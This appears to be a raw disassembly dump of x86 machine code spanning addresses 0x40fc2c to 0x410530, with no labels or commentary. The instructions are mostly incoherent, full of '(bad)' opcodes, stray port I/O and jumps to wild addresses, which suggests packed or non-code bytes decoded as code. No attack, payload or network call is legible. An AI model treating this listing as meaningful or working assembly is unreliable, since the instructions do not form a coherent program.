  40fc2c:	mov    esi,DWORD PTR [edx]
  40fc2e:	in     al,dx
  40fc2f:	sub    eax,0x2a44fffc
  40fc34:	(bad)  
  40fc35:	repz loop 0x40fc85
  40fc38:	or     BYTE PTR [esp+eax*1-0x6ffffd5e],al
  40fc3f:	lods   eax,DWORD PTR ds:[esi]
  40fc40:	add    DWORD PTR [eax],eax
  40fc42:	jmp    0x40fc47
	...
  40fc57:	add    ah,cl
  40fc59:	lods   eax,DWORD PTR ds:[esi]
  40fc5a:	inc    esi
  40fc5b:	sub    BYTE PTR [ebx-0x7d6ec989],ch
  40fc61:	push   ss
  40fc62:	add    cl,ch
  40fc64:	mov    cl,0x42
  40fc66:	push   cs
  40fc67:	ins    BYTE PTR es:[edi],dx
  40fc68:	pop    ss
  40fc69:	jbe    0x40fc69
  40fc6b:	jmp    0xe948f199
  40fc70:	popf   
  40fc71:	jle    0x40fc5c
  40fc73:	jmp    0xdf3fff1c
  40fc78:	lods   al,BYTE PTR ds:[esi]
  40fc79:	push   0x5f
  40fc7b:	mov    ds:0xac8874ed,eax
  40fc80:	hlt    
  40fc81:	je     0x40fcf9
  40fc83:	icebp  
  40fc84:	fucomp st(6)
  40fc86:	out    dx,eax
  40fc87:	ss push esp
  40fc89:	or     ch,al
  40fc8b:	addr16 popa 
  40fc8d:	jne    0x40fc8d
  40fc8f:	xchg   ecx,eax
  40fc90:	or     eax,0xbde940bd
  40fc95:	out    dx,al
  40fc96:	out    dx,eax
  40fc97:	add    edx,ecx
  40fc99:	sbb    BYTE PTR [eax],al
  40fc9b:	jmp    0x6c4f3f41
  40fca0:	div    DWORD PTR [ebp-0x2]
  40fca3:	jmp    0xaccc72ba
  40fca8:	mov    ebp,es
  40fcaa:	mov    WORD PTR [eax+ecx*4-0x516963b],fs
  40fcb1:	jne    0x40fd07
  40fcb3:	ficom  WORD PTR [edi-0x5cd7d0e0]
  40fcb9:	or     eax,eax
  40fcbb:	fiadd  WORD PTR [eax]
	...
  40fcd1:	jo     0x40fc5f
  40fcd3:	(bad)  
  40fcd4:	(bad)  
  40fcd5:	inc    BYTE PTR [ecx]
  40fcd7:	lea    eax,[ebp-0x16]
  40fcda:	push   ecx
  40fcdb:	std    
  40fcdc:	jne    0x40fcc4
  40fcde:	clc    
  40fcdf:	jae    0x40fccd
  40fce1:	add    DWORD PTR [ebx],edx
  40fce3:	out    0x2e,al
  40fce5:	jg     0x40fce5
  40fce7:	or     al,al
  40fce9:	call   0x6852:0x2e458b76
  40fcf0:	add    BYTE PTR [esi+edi*8-0x16bf897],ah
  40fcf7:	(bad)  
  40fcf8:	jne    0x40fd24
  40fcfa:	clc    
  40fcfb:	adc    ebp,edx
  40fcfd:	pusha  
  40fcfe:	dec    BYTE PTR ds:[edx]
  40fd01:	ds gs push esp
  40fd04:	jmp    FWORD PTR [ebx-0x1f]
  40fd07:	out    0xe8,al
  40fd09:	aaa    
  40fd0a:	clc    
  40fd0b:	std    
  40fd0c:	mov    DWORD PTR [ebx-0x33],ecx
  40fd0f:	mov    eax,DWORD PTR [ebp-0x22]
  40fd12:	push   ecx
  40fd13:	std    
  40fd14:	jne    0x40fcd8
  40fd16:	addr16 (bad) 
  40fd18:	imul   ecx,DWORD PTR [ecx+0x67],0xd51bfefe
  40fd1f:	std    
  40fd20:	adc    eax,0x412be4
  40fd25:	push   ebp
  40fd26:	shl    DWORD PTR [edx+0x29],0x16
  40fd2a:	add    DWORD PTR [eax],eax
  40fd2c:	out    dx,eax
  40fd2d:	sar    al,1
  40fd2f:	jae    0x40fd39
  40fd31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd32:	xor    DWORD PTR [esi-0x1],eax
	...
  40fd49:	add    BYTE PTR [ecx+0x210874f8],ah
  40fd4f:	jb     0x40fd53
  40fd51:	call   FWORD PTR [ebx+0x4858e809]
  40fd57:	clc    
  40fd58:	std    
  40fd59:	jmp    FWORD PTR [ebx-0x22]
  40fd5c:	std    
  40fd5d:	jne    0x40fda1
  40fd5f:	sti    
  40fd60:	jae    0x40fd6a
  40fd62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd63:	inc    ebx
  40fd64:	int    0x45
  40fd66:	lock inc ebx
  40fd68:	js     0x40fdde
  40fd6a:	retf   
  40fd6b:	push   edx
  40fd6c:	test   BYTE PTR [eax-0x20],cl
  40fd6f:	mov    bl,0x78
  40fd71:	je     0x40fd36
  40fd73:	stos   DWORD PTR es:[edi],eax
  40fd74:	push   cs
  40fd75:	out    dx,al
  40fd76:	sub    DWORD PTR [edx],0x9ca76a04
  40fd7c:	out    dx,al
  40fd7d:	jmp    0x40fd3f
  40fd7f:	ins    DWORD PTR es:[edi],dx
  40fd80:	je     0x40fdaf
  40fd82:	imul   si,WORD PTR [edi+0x74],0xffb7
  40fd87:	and    al,0x48
  40fd8a:	test   al,0x7b
  40fd8c:	test   dh,al
  40fd8e:	mov    bh,0xf4
  40fd90:	(bad)  
  40fd91:	repz and al,0x6f
  40fd94:	outs   dx,BYTE PTR ds:[esi]
  40fd95:	jmp    DWORD PTR [ecx-0x77029422]
  40fd9b:	(bad)  [edx-0x4c]
  40fd9e:	adc    ebp,0xcca76978
  40fda4:	out    dx,al
  40fda5:	div    DWORD PTR [eax+0x6f]
  40fda8:	sbb    BYTE PTR [edi],ch
  40fdaa:	out    0x69,al
  40fdac:	ja     0x40fe22
	...
  40fdc2:	add    BYTE PTR [ebx+0x35],ah
  40fdc5:	out    dx,eax
  40fdc6:	pop    es
  40fdc7:	dec    edi
  40fdc8:	lock sar esi,0x50
  40fdcc:	test   eax,ebx
  40fdce:	enter  0x6665,0x2
  40fdd2:	push   ebp
  40fdd3:	sub    al,0x6
  40fdd5:	add    ebx,0x5b
  40fdd8:	adc    eax,0x9f22fe79
  40fddd:	jbe    0x40fe2e
  40fddf:	sub    bh,dh
  40fde1:	push   es
  40fde2:	(bad)  
  40fde3:	(bad)  
  40fde5:	sub    DWORD PTR [ecx-0x59],eax
  40fde8:	add    ebp,edi
  40fdea:	sbb    ah,BYTE PTR [edi-0x673ff497]
  40fdf0:	add    ch,BYTE PTR [eax+ebp*4-0x59]
  40fdf4:	add    ch,cl
  40fdf6:	inc    eax
  40fdf7:	arpl   WORD PTR [edx-0x18],di
  40fdfa:	add    esp,DWORD PTR [edi-0xb4159fe]
  40fe00:	jae    0x40fdef
  40fe02:	add    esp,DWORD PTR [edi-0x27121718]
  40fe08:	jmp    0x8711ebf5
  40fe0d:	and    esi,DWORD PTR [eax+0x58]
  40fe10:	test   DWORD PTR [ebx+0x6f],ebp
  40fe13:	mov    ecx,0xb9d39d73
  40fe18:	in     eax,dx
  40fe19:	nop
  40fe1a:	js     0x40fe57
  40fe1c:	jbe    0x40fd9e
  40fe1e:	(bad)  
  40fe1f:	lea    eax,[edx]
  40fe21:	jmp    0xe42f6532
  40fe26:	push   0x0
	...
  40fe3c:	push   ss
  40fe3d:	add    ch,cl
  40fe3f:	add    edi,edi
  40fe41:	popa   
  40fe42:	rol    dl,0x88
  40fe45:	je     0x40fe22
  40fe47:	pop    es
  40fe48:	(bad)  
  40fe49:	repnz lods al,BYTE PTR ds:[esi]
  40fe4b:	js     0x40fec6
  40fe4d:	shl    BYTE PTR [ecx+0x53],cl
  40fe50:	and    edi,DWORD PTR [ebp+0x54]
  40fe53:	jo     0x40febe
  40fe55:	jae    0x40fdef
  40fe57:	aad    0x48
  40fe59:	loop   0x40fe07
  40fe5b:	js     0x40feb6
  40fe5d:	mov    DWORD PTR [ebx+0x57],ebp
  40fe60:	pop    ecx
  40fe61:	jae    0x40fe90
  40fe63:	imul   edx,DWORD PTR [edx],0xffffffca
  40fe66:	and    eax,0x9102ce78
  40fe6b:	ins    BYTE PTR es:[edi],dx
  40fe6c:	loope  0x40fe2f
  40fe6e:	call   0x1596f9eb
  40fe73:	js     0x40fe9e
  40fe75:	jae    0x40fe32
  40fe77:	repz iret 
  40fe79:	shr    eax,0x6b
  40fe7c:	push   edx
  40fe7d:	(bad)  
  40fe7e:	push   ebp
  40fe80:	cwde   
  40fe81:	mov    al,BYTE PTR [ecx+edi*8+0x53fe7478]
  40fe88:	stos   DWORD PTR es:[edi],eax
  40fe89:	jmp    0x9cfd:0x72e226ef
  40fe90:	dec    edi
  40fe91:	ins    BYTE PTR es:[edi],dx
  40fe92:	dec    dh
  40fe94:	jo     0x40fec4
  40fe96:	jo     0x40fea8
  40fe98:	jmp    0xfe73:0xec61e672
  40fe9f:	pusha  
	...
  40feb4:	add    BYTE PTR [esi],ah
  40feb6:	imul   BYTE PTR [bp-0x16b0]
  40febb:	call   DWORD PTR [eax]
  40febd:	ss mov esp,0xae31e940
  40fec3:	fistp  DWORD PTR [esi-0x2b018bc8]
  40fec9:	mov    ah,0x29
  40fecb:	inc    ecx
  40fecc:	jmp    0x7e8beadd
  40fed1:	adc    BYTE PTR [ebx-0x7c],bh
  40fed4:	add    DWORD PTR [eax],0xa303fe71
  40feda:	(bad)  
  40fedc:	scas   al,BYTE PTR es:[edi]
  40fedd:	imul   esi,DWORD PTR [edx-0x3],0xffffff94
  40fee1:	fistp  QWORD PTR [eax-0x2]
  40fee4:	push   esi
  40fee5:	clc    
  40fee6:	ss jo  0x40fee9
  40fee9:	bound  esi,QWORD PTR [edx-0x1a]
  40feec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feed:	ins    DWORD PTR es:[edi],dx
  40feee:	jno    0x40feee
  40fef0:	jo     0x40ff18
  40fef2:	data16 div BYTE PTR [esi]
  40fef5:	fcomp  st(3)
  40fef7:	inc    eax
  40fef9:	ror    eax,1
  40fefb:	inc    eax
  40fefc:	jmp    0x171cb5ba
  40ff01:	mov    al,0x70
  40ff03:	(bad)  
  40ff04:	fdiv   QWORD PTR [ebx+ebx*1]
  40ff07:	inc    ecx
  40ff08:	jmp    0x8c2ec9
  40ff0d:	test   eax,0xae8587f9
  40ff12:	loope  0x40ff11
  40ff14:	(bad)  
  40ff15:	jge    0x40fec2
  40ff17:	jmp    0x0:0xf7
	...
  40ff2e:	stc    
  40ff2f:	clc    
  40ff30:	(bad)  
  40ff31:	jae    0x40fef0
  40ff33:	pop    esi
  40ff34:	(bad)  
  40ff35:	(bad)  
  40ff36:	jmp    0x6b6fcf2
  40ff3b:	ficom  WORD PTR [ecx-0x20726bc]
  40ff41:	mov    ch,0x1e
  40ff43:	loope  0x40ff42
  40ff45:	call   FWORD PTR [ecx]
  40ff47:	jae    0x40ff4f
  40ff49:	call   0x3eb12f
  40ff4e:	stc    
  40ff4f:	mov    dl,0xea
  40ff51:	test   DWORD PTR [ecx],0xb675fdf9
  40ff57:	fst    st(7)
  40ff59:	inc    esp
  40ff5a:	sbb    ecx,edi
  40ff5c:	std    
  40ff5d:	mov    ch,0x26
  40ff5f:	loope  0x40ff5e
  40ff61:	jmp    FWORD PTR [ecx]
  40ff63:	jb     0x40ff6b
  40ff65:	call   0x3eb0bf
  40ff6a:	sbb    DWORD PTR [ebx-0x706081e],esi
  40ff70:	std    
  40ff71:	jne    0x40ffe9
  40ff73:	fnstsw WORD PTR [ebx-0x20726bc]
  40ff79:	mov    ch,0xde
  40ff7b:	loopne 0x40ff7a
  40ff7d:	(bad)  
  40ff7e:	fnstenv [edx+0x6]
  40ff81:	call   0x3eb0bf
  40ff86:	cdq    
  40ff87:	mov    dl,0xda
  40ff89:	neg    DWORD PTR [ecx+0x4675fdf8]
  40ff8f:	fnstsw WORD PTR [esi-0x2]
	...
  40ffa6:	add    BYTE PTR [ecx+0x7ab5fdf8],cl
  40ffac:	loopne 0x40ffab
  40ffae:	jmp    DWORD PTR [edi+0x2846aa03]
  40ffb4:	add    BYTE PTR [esi-0x4c],dh
  40ffb7:	pop    ss
  40ffb8:	jo     0x41002e
  40ffba:	dec    BYTE PTR [edi]
  40ffbc:	mov    ebx,0x7810febd
  40ffc1:	scas   al,BYTE PTR es:[edi]
  40ffc2:	jmp    0x40ffd4
  40ffc4:	pusha  
  40ffc5:	je     0x40ffae
  40ffc7:	sbb    ah,BYTE PTR [eax]
  40ffc9:	jne    0x40ffc9
  40ffcb:	clc    
  40ffcc:	xchg   ebp,eax
  40ffcd:	imul   esi,esi,0xfffffff0
  40ffd0:	push   edi
  40ffd1:	imul   ecx,DWORD PTR [ecx-0x18bbfa0],0x1a
  40ffd8:	aas    
  40ffd9:	ins    BYTE PTR es:[edi],dx
  40ffda:	(bad)  
  40ffdb:	fcom   DWORD PTR [edx-0xc]
  40ffde:	inc    esi
  40ffdf:	shl    BYTE PTR [edi-0x48384b8c],1
  40ffe5:	je     0x40ffe5
  40ffe7:	iret   
  40ffe8:	push   cs
  40ffe9:	mov    ebp,0xbe8fb8fe
  40ffee:	idiv   DWORD PTR [esi-0x57018a06]
  40fff4:	jg     0x40ffe4
  40fff6:	sti    
  40fff7:	(bad)
  40fffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fffc:	mov    dl,0x41
  40fffe:	pop    es
  40ffff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410000:	push   cs
  410001:	mov    ebx,ebp
  410003:	and    al,0xa6
  410005:	ja     0x410070
  410007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410008:	push   ebx
  410009:	leave  
  41000a:	inc    BYTE PTR [eax]
	...
  410020:	bnd jno 0x41008d
  410023:	test   ebx,ebp
  410025:	fdiv   DWORD PTR [eax+ecx*4-0x1e]
  410029:	mov    ebp,0x9ae8cbeb
  41002e:	add    bh,bh
  410030:	shl    BYTE PTR [ecx+0x6a],cl
  410033:	pop    es
  410034:	push   ecx
  410035:	cmp    DWORD PTR [ebp-0x2],esi
  410038:	rcr    BYTE PTR ds:0x2af7475,cl
  41003e:	adc    DWORD PTR [ebx+0x4b1d6fe4],esi
  410044:	popw   es
  410046:	jmp    0x69a01e19
  41004b:	inc    eax
  41004c:	adc    al,0x70
  41004e:	jnp    0x410057
  410050:	mov    tr4,ecx
  410053:	add    esp,DWORD PTR [edi-0x5b10d705]
  410059:	cmp    DWORD PTR [edx],ebp
  41005b:	or     BYTE PTR [edi+0xf145b6f],ah
  410061:	push   ss
  410062:	add    DWORD PTR [edi+eiz*4],eax
  410065:	sti    
  410066:	test   al,0xee
  410068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410069:	cmp    DWORD PTR [edx+0x2b79a707],ebp
  41006f:	jl     0x41004a
  410071:	cmc    
  410072:	shr    BYTE PTR [ebx-0x45],0xc7
  410076:	mov    ch,0x74
  410078:	pop    ds
  410079:	(bad)  
  41007a:	lods   al,BYTE PTR ds:[esi]
  41007b:	je     0x4100b8
  41007d:	outs   dx,BYTE PTR ds:[esi]
  41007e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41007f:	out    dx,al
  410080:	mov    al,0x6f
  410082:	adc    edx,DWORD PTR [eax+eax*1]
	...
  410099:	mov    edi,0xa9753a40
  41009e:	sti    
  41009f:	test   al,0xef
  4100a1:	fnstsw WORD PTR [ecx+0x2b]
  4100a4:	jo     0x4100b4
  4100a6:	add    ebp,DWORD PTR [esi+edi*4-0x6c]
  4100aa:	shl    BYTE PTR [ebp-0x12],cl
  4100ad:	mov    WORD PTR [edx-0x46],ds
  4100b0:	out    0x81,eax
  4100b2:	outs   dx,DWORD PTR ds:[esi]
  4100b3:	icebp  
  4100b4:	inc    ebx
  4100b5:	hlt    
  4100b6:	sub    cl,dl
  4100b8:	add    edx,DWORD PTR [edi-0xc8b69a1]
  4100be:	cli    
  4100bf:	inc    eax
  4100c0:	shl    ebp,cl
  4100c2:	outs   dx,DWORD PTR ds:[esi]
  4100c3:	inc    ebp
  4100c4:	je     0x410099
  4100c6:	(bad)  
  4100c7:	cmp    eax,0xff5aa8ee
  4100cc:	lea    esp,[edi+0x70]
  4100cf:	(bad)  
  4100d0:	cs push ecx
  4100d2:	jae    0x4100d2
  4100d4:	pushf  
  4100d5:	mov    al,0x70
  4100d7:	je     0x4100ca
  4100d9:	mov    esp,0xb31642de
  4100de:	jo     0x410154
  4100e0:	or     eax,0x645a58c
  4100e5:	xchg   ebx,eax
  4100e6:	cmp    al,cl
  4100e8:	in     eax,dx
  4100e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ea:	aad    0x8a
  4100ec:	add    eax,0x97d34327
  4100f1:	jnp    0x4100e9
  4100f3:	or     edx,ecx
  4100f5:	or     al,0xbc
  4100f7:	(bad)  
  4100f8:	fdivrp st(0),st
  4100fa:	scas   al,BYTE PTR es:[edi]
  4100fb:	je     0x4100e9
	...
  410111:	add    dh,dl
  410113:	cmp    ecx,eax
  410115:	frstor [ebp+edi*2+0x6ff3b944]
  41011c:	je     0x41010b
  41011e:	ins    BYTE PTR es:[edi],dx
  41011f:	or     cl,BYTE PTR [esi+esi*4+0x54]
  410123:	cld    
  410124:	mov    edi,0xff4f28de
  410129:	call   0x9db570d2
  41012e:	push   ebx
  41012f:	xchg   BYTE PTR [ebp-0x6a],al
  410132:	xor    al,0x7a
  410134:	inc    esp
  410135:	jge    0x41014b
  410137:	idiv   ebx
  410139:	xchg   BYTE PTR [esi-0x30b01a6],bl
  41013f:	gs stos BYTE PTR es:[edi],al
  410141:	das    
  410142:	adc    al,0x6d
  410144:	mov    dh,ah
  410146:	loopne 0x4101a2
  410148:	mov    ds:0x6802a4e9,al
  41014d:	push   es
  41014e:	xor    eax,ebx
  410150:	(bad)  
  410151:	mov    esi,0xe91775cc
  410156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410157:	stc    
  410158:	mov    edi,0xe8fb1b00
  41015d:	cwde   
  41015e:	add    al,BYTE PTR ds:[eax]
  410161:	mov    ecx,DWORD PTR [esi+0xf48254e]
  410167:	add    ch,al
  410169:	cmp    DWORD PTR [ecx],edi
  41016b:	add    al,BYTE PTR [eax]
  41016d:	add    ecx,DWORD PTR [esi+0x26e873ef]
  410173:	sub    DWORD PTR [eax+0x41],ecx
	...
  41018a:	add    BYTE PTR [esi],cl
  41018c:	dec    esp
  41018d:	out    0xd3,al
  41018f:	push   es
  410190:	add    al,BYTE PTR [eax]
  410192:	or     edi,DWORD PTR [esi-0x7714ff95]
  410198:	out    dx,eax
  410199:	push   cs
  41019a:	mov    BYTE PTR [ebx],bl
  41019c:	in     eax,0x87
  41019e:	inc    ebp
  41019f:	jmp    0x5606:0xbf483749
  4101a6:	call   0x40fbbf
  4101ab:	(bad)
  4101ae:	add    dh,ch
  4101b0:	push   edx
  4101b1:	mov    eax,esi
  4101b3:	jbe    0x4101d4
  4101b5:	dec    eax
  4101b6:	inc    ecx
  4101b7:	mov    esi,0xce16fcc9
  4101bc:	add    DWORD PTR [ebx],eax
  4101be:	lock aaa 
  4101c0:	push   0xffffffda
  4101c2:	push   0x3fa9d9
  4101c7:	push   0x8e1896ce
  4101cc:	add    DWORD PTR [ebx],ecx
  4101ce:	rcr    BYTE PTR [ebx+0x143beb07],0x12
  4101d5:	mov    BYTE PTR [ebp+0x29],dl
  4101d8:	out    dx,al
  4101d9:	inc    ebx
  4101da:	fadd   DWORD PTR ds:0x8ec6e23b
  4101e0:	add    DWORD PTR [ebx-0x14419bb],ecx
  4101e6:	jmp    DWORD PTR [edi+0x60dbf7d4]
  4101ec:	push   esi
  4101ed:	pop    edx
  4101ee:	inc    BYTE PTR [eax]
	...
  410204:	shl    BYTE PTR [ebx+0x5a],cl
  410207:	xchg   edx,eax
  410208:	push   ecx
  410209:	sub    al,0x72
  41020b:	mov    edx,esi
  41020d:	mov    eax,0xe34b447d
  410212:	adc    cl,BYTE PTR [edx+0x447e2cd2]
  410218:	dec    edi
  410219:	repz adc al,BYTE PTR [eax-0x7afea497]
  410220:	jnp    0x41021e
  410222:	jno    0x410222
  410224:	sbb    dh,ch
  410226:	pop    esi
  410227:	out    0x46,eax
  410229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41022a:	jno    0x41022a
  41022c:	sbb    bl,BYTE PTR [esi+0x240f4f72]
  410232:	mov    esi,0x34ff8fe
  410237:	pop    esi
  410238:	ficomp WORD PTR [eax-0x1fad0001]
  41023e:	pop    edi
  41023f:	(bad)  
  410240:	pop    edx
  410241:	dec    edi
  410242:	pop    edx
  410243:	aam    0x6e
  410245:	inc    esp
  410246:	jo     0x410252
  410248:	out    0x36,eax
  41024a:	sbb    ebp,DWORD PTR [eax-0x63]
  41024d:	and    eax,ebx
  41024f:	push   DWORD PTR [eax+0x43]
  410252:	fisttp QWORD PTR [eax-0x48]
  410255:	mov    ds:0xa9a167d3,eax
  41025a:	ret    
  41025b:	inc    DWORD PTR [eax+0x5b]
  41025e:	add    ch,bh
  410260:	popa   
  410261:	add    cl,BYTE PTR ds:0xd259e648
  410267:	inc    BYTE PTR [eax]
	...
  41027d:	sbb    dh,BYTE PTR [edx+0x5a]
  410280:	cmp    edi,0xdee770f4
  410286:	es jno 0x410287
  410289:	outs   dx,BYTE PTR ds:[esi]
  41028a:	add    ebp,DWORD PTR [ebx]
  41028c:	cld    
  41028d:	jo     0x410266
  41028f:	jno    0x4102f1
  410291:	and    eax,0x60de5447
  410296:	fisub  DWORD PTR [edx+0x50fad370]
  41029c:	in     eax,dx
  41029d:	out    0x6b,al
  41029f:	cmp    eax,0xc26ee37b
  4102a4:	or     eax,0x5be0f640
  4102a9:	add    ebp,DWORD PTR [ebp+eiz*1+0x71]
  4102ad:	mov    esi,0xa0f71e1f
  4102b2:	pop    edx
  4102b3:	jno    0x410326
  4102b5:	and    DWORD PTR [edx+eax*4+0xf],ebp
  4102b9:	sbb    dh,dh
  4102bb:	lock pop ebx
  4102bd:	aaa    
  4102be:	ins    BYTE PTR es:[edi],dx
  4102bf:	std    
  4102c0:	jo     0x410242
  4102c2:	add    ch,cl
  4102c4:	pusha  
  4102c5:	inc    edx
  4102c6:	fcmovnbe st,st(3)
  4102c8:	mov    ebx,0xfe510267
  4102cd:	push   0x7370e8c1
  4102d2:	cli    
  4102d3:	shl    BYTE PTR [esi],0x4d
  4102d6:	imul   ecx,ebp,0x70
  4102d9:	push   ebx
  4102da:	outs   dx,BYTE PTR ds:[esi]
  4102db:	(bad)
  4102de:	pop    edx
  4102df:	mov    BYTE PTR ds:[eax],0x0
	...
  4102f3:	add    BYTE PTR [eax],al
  4102f5:	add    cl,cl
  4102f7:	imul   ebx,DWORD PTR [edi+0x1402a445],0x7d
  4102fe:	int3   
  4102ff:	sub    DWORD PTR [ebx+ecx*2+0x7e9d6bb9],0x71386e63
  41030a:	sbb    edi,edi
  41030c:	(bad)  
  41030d:	mul    BYTE PTR [eax-0x58e6d3a6]
  410313:	add    dh,dl
  410315:	inc    ebx
  410316:	cdq    
  410317:	test   edi,edi
  410319:	test   al,0xa5
  41031b:	add    al,BYTE PTR [eax]
  41031d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41031e:	popa   
  41031f:	jae    0x410320
  410321:	call   0xa50805ca
  410326:	lock ins BYTE PTR es:[edi],dx
  410328:	push   es
  410329:	jmp    0xc340dbd2
  41032e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41032f:	fdivr  st,st(7)
  410331:	shl    BYTE PTR [ebp+edi*2+0x7e743544],cl
  410338:	test   BYTE PTR ds:0x99fe6cbf,bh
  41033e:	mov    bh,0xf6
  410340:	mul    DWORD PTR [esi]
  410342:	cmp    DWORD PTR [edi-0x19],esp
  410345:	test   DWORD PTR [edi+0x64e20002],0x230004ef
  41034f:	add    al,BYTE PTR [eax]
  410351:	jmp    0xa8686542
  410356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410357:	imul   esi,DWORD PTR [ebp+eiz*8+0x0],0x0
	...
  41036c:	add    BYTE PTR [eax],al
  41036e:	add    BYTE PTR [edx+ebp*1+0x48],bl
  410372:	out    dx,al
  410373:	mov    BYTE PTR [ebx-0x79d94676],bh
  410379:	repz (bad) 
  41037b:	js     0x4103e9
  41037d:	dec    edi
  41037e:	cmp    eax,DWORD PTR [ebx+0x48ce481a]
  410384:	jp     0x41030a
  410386:	mov    eax,ds:0xd1fe6c58
  41038b:	mov    eax,0xddb6febe
  410390:	push   0x66
  410392:	inc    esp
  410393:	sti    
  410394:	sar    edi,0xa5
  410397:	out    dx,al
  410398:	push   edx
  410399:	neg    BYTE PTR [esi-0x1e8b93c8]
  41039f:	cld    
  4103a0:	add    DWORD PTR [esi-0x72],0x8
  4103a4:	jnp    0x41032a
  4103a6:	add    BYTE PTR [esi],cl
  4103a8:	repnz std 
  4103aa:	push   DWORD PTR [esi+edi*8+0x3fc66e67]
  4103b1:	(bad)  
  4103b2:	(bad)  
  4103b3:	mov    bl,0xb6
  4103b5:	cmc    
  4103b6:	dec    DWORD PTR [ecx]
  4103b8:	fidiv  DWORD PTR [ebx+0x8]
  4103bb:	(bad)  
  4103bc:	popa   
  4103bd:	inc    ebp
  4103be:	(bad)  
  4103bf:	stc    
  4103c0:	out    0x83,eax
  4103c2:	in     al,dx
  4103c3:	icebp  
  4103c4:	fscale 
  4103c6:	push   0x3e
  4103c8:	dec    esi
  4103c9:	jne    0x410413
  4103cb:	inc    DWORD PTR ds:0xf196b5ff
  4103d1:	std    
  4103d2:	inc    DWORD PTR [eax]
	...
  4103e8:	mov    DWORD PTR [ebx+0x6],ebp
  4103eb:	call   0x3e44ea
  4103f0:	mov    bh,0x7b
  4103f2:	out    0xf7,al
  4103f4:	mov    ecx,0xca858bd9
  4103f9:	icebp  
  4103fa:	std    
  4103fb:	jmp    FWORD PTR [esi]
  4103fd:	dec    esi
  4103fe:	jle    0x410448
  410400:	aas    
  410401:	push   es
  410402:	push   DWORD PTR [ebp-0x20e6a]
  410408:	or     DWORD PTR [ebx+0x6],ebp
  41040b:	call   0x3e45aa
  410410:	ja     0x41048c
  410412:	loop   0x41040b
  410414:	stc    
  410415:	fsubr  DWORD PTR [eax+0x0]
  410418:	in     ax,dx
  41041a:	inc    esi
  41041b:	inc    ecx
  41041c:	mov    esi,0x11d8b3d8
  410421:	fscale 
  410423:	inc    DWORD PTR [ebx-0x7eee199a]
  410429:	fscale 
  41042b:	mov    DWORD PTR [ebx-0x1b],eax
  41042e:	cmc    
  41042f:	dec    DWORD PTR [ecx]
  410431:	test   DWORD PTR [ebx+0x6d88a7f0],edi
  410437:	(bad)  
  410438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410439:	pand   mm0,QWORD PTR [edx-0x18a70ae]
  410440:	mov    BYTE PTR [ebx-0xa],bl
  410443:	popa   
  410444:	and    al,0x2e
  410446:	pop    ebx
  410447:	idiv   BYTE PTR [eax-0x28]
  41044a:	add    dh,BYTE PTR [eax+eax*1+0x0]
	...
  41045e:	add    BYTE PTR [eax],al
  410460:	add    dh,cl
  410462:	push   ebx
  410463:	add    al,BYTE PTR [eax]
  410465:	js     0x4103f0
  410467:	ins    DWORD PTR es:[edi],dx
  410468:	je     0x410421
  41046a:	ret    
  41046b:	(bad)  
  41046c:	aas    
  41046d:	pop    eax
  41046e:	mov    eax,0x2857b46d
  410473:	outs   dx,BYTE PTR ds:[esi]
  410474:	dec    BYTE PTR [eax-0x52]
  410477:	adc    ch,al
  410479:	setnp  BYTE PTR [ebp-0x2]
  41047d:	cmp    dh,ch
  41047f:	pop    esi
  410480:	div    BYTE PTR [eax]
  410482:	and    BYTE PTR [esi+0x74],ch
  410485:	xchg   edi,eax
  410486:	adc    ecx,DWORD PTR [ecx+0x6e10203f]
  41048c:	mov    ah,0xf
  41048e:	adc    BYTE PTR [esi-0x2],ch
  410491:	adc    dh,ah
  410493:	adc    ch,al
  410495:	sbb    ebx,DWORD PTR [ebx+0x2600fe6d]
  41049b:	dec    edi
  41049c:	idiv   al
  41049e:	push   edi
  41049f:	ins    BYTE PTR es:[edi],dx
  4104a0:	mov    ah,0xb
  4104a2:	dec    eax
  4104a3:	ins    BYTE PTR es:[edi],dx
  4104a4:	(bad)  
  4104a5:	call   0x74291877
  4104aa:	sbb    ebp,DWORD PTR [ebp-0x2]
  4104ad:	fmul   DWORD PTR [ebp+0x3fd0f663]
  4104b3:	ins    BYTE PTR es:[edi],dx
  4104b4:	je     0x41046d
  4104b6:	push   ebx
  4104b7:	fnstcw WORD PTR [edi]
  4104b9:	shr    BYTE PTR [edi-0x67688b94],0xb6
  4104c0:	xlat   BYTE PTR ds:[ebx]
  4104c1:	mov    eax,0x6da601
	...
  4104da:	test   eax,0x165bf0ee
  4104df:	imul   edx,DWORD PTR [ebp-0x4f516693],0x90689175
  4104e9:	loope  0x4104d0
  4104eb:	addr16 jge 0x41055b
  4104ee:	cmp    esi,DWORD PTR [ebx+0x7d]
  4104f1:	ins    DWORD PTR es:[edi],dx
  4104f2:	jns    0x41054f
  4104f4:	adc    cl,al
  4104f6:	jno    0x410560
  4104f8:	gs mov bh,0x7c
  4104fb:	jo     0x41055a
  4104fd:	ins    DWORD PTR es:[edi],dx
  4104fe:	dec    eax
  4104ff:	mov    dh,0xa9
  410501:	ins    BYTE PTR es:[edi],dx
  410502:	pop    ecx
  410503:	push   0x68595c93
  410508:	inc    ebp
  410509:	pop    esp
  41050a:	out    0xc3,al
  41050c:	cmp    eax,0x4cae416d
  410511:	jne    0x41054c
  410513:	push   0x67e43540
  410518:	and    eax,0x1562f36d
  41051d:	ins    DWORD PTR es:[edi],dx
  41051e:	and    DWORD PTR [ebx-0x3c],ebx
  410521:	rcr    BYTE PTR [ecx],0x68
  410524:	or     eax,0xb55a18c7
  410529:	ins    DWORD PTR es:[edi],dx
  41052a:	or     DWORD PTR [eax-0x3],ebp
  41052d:	idiv   ah
  41052f:	pop    edx
  410530:	jle    0x410548
